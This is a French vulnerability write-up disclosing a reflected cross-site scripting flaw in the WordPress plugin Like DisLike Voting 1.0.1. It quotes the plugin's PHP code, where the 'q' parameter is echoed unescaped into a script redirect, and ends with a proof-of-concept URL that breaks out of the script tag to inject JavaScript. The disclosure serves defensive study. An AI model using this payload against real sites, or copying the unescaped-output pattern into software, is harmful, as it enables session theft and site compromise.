---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress Like DisLike Voting"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [Like DisLike Voting](https://wordpress.org/plugins/like-dislike-voting/) (slug: `like-dislike-voting`) se présente de cette façon :

> Get like-dislike rating for your content. You can use the plugin to allow your user for rating as Like or Dislike to your content.
>
> It also counts and shows number of Like and Dislike hit. In dashboard you will find plugin option for placement of Like-Dislike button and also you can control voting type. You can allow everyone to rate your content and You also can allow registered user only to rate your content. It has simple codes that never crash with other plugin/theme.

La version testée est la 1.0.1 et date d'il y a 8 ans au moment de ces lignes.

## La vulnérabilité

Le script `index.php` du plugin ne fait que charger différents fichiers :

```php
require 'files/session.php';

require 'files/function.php';
 
require 'files/like.php';

require 'files/options.php';
```

C'est le fichier `like.php` qui nous intéresse, surtout la fonction `ldv_like_post` appelée comme hook :

```php
add_action('wp_head', 'ldv_like_post');
```

Cette fonction est la suivante :

```php
function ldv_like_post($content)
{
        if($_REQUEST['act']=='like' && $_REQUEST['q']!="" && $_SESSION[$_REQUEST['q'].'_post_like']=="") {
                $_SESSION[$_REQUEST['q'].'_post_like']='done';
                $counts=get_post_meta($_REQUEST['q'],'ldv_like_post',true)+1;
                add_post_meta($_REQUEST['q'], 'ldv_like_post', $counts, true);  
                update_post_meta($_REQUEST['q'], 'ldv_like_post', $counts);
                $url_rdir="http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?p=".$_REQUEST['q'];
                                                
                if(get_option('vote_type')=='reg')
                {                                       
                        $current_user = wp_get_current_user();
                        $usr_id=$current_user->ID;
                        $vote_done=get_option('vote_done');
                        if($vote_done=='') {
                                $vote_done[$usr_id]=$_REQUEST['q'];
                                add_option('vote_done',$vote_done);
                        } else {
                                if($vote_done[$usr_id]=='') {
                                        $vote_done[$usr_id]=$_REQUEST['q'];
                                } else {
                                        $vote_pst=explode(",",$vote_done[$usr_id]);
                                        for($i=0;$i<=count($vote_pst);$i++) {
                                                if($vote_pst[$i]!=$_REQUEST['q']) {
                                                        $do_vote="yes";
                                                        break;
                                                } 
                                        }
                                        if($do_vote=='yes') {
                                                $vote_done[$usr_id]=$vote_done[$usr_id].",".$_REQUEST['q'];
                                        }
                                }
                                update_option('vote_done',$vote_done);
                        }
                }
?>
                <script type="text/javascript">
                window.location = "<?php echo $url_rdir; ?>";
                </script>
<?php
        }
        if($_REQUEST['act']=='unlike' && $_REQUEST['q']!="" && $_SESSION[$_REQUEST['p'].'_post_like']=="") {
        --- snip ---
```

La suite du code est très ressemblante au premier bloc, mais avec le `dislike`.

Ce qui nous intéresse ici, c'est la variable `$url_rdir` qui est formée à l'aide du paramètre `q` puis affichée à la fin dans du code Javascript.

On peut donc inclure du code JS ici, mais pour que l'interprétation ait lieu il faut d'abord faire échouer la redirection basée sur `window.location`.

Pour cela, on va provoquer une erreur de syntaxe dans la balise script courante (en ne fermant pas la string) et ouvrir une autre balise script pour l'exploitation.

PoC :

```
http://localhost:8000/?q=%3C/script%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E&act=unlike
```

Ce qui rend le code suivant :

```html
		<script type="text/javascript">
		window.location = "http://localhost:8000/index.php?p=</script><script>alert(/XSS/)</script>";
		</script>
```
